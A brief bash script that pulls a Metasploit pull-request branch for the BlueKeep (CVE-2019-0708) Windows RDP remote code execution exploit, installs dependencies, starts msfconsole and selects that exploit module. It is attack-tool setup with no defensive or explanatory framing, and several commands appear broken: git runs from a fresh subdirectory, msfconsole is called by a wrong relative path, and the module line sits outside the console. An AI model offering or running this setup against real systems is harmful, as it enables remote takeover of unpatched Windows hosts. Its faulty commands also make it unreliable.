#!/usr/bin/bash
cd /usr/share/metasploit-framework/modules/exploits/windows
    mkdir -p rdp
        cd rdp
    git fetch origin pull/12283/head:bluekeep
    git checkout bluekeep
      gem install bundler && bundle
        ./msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
exit 0;

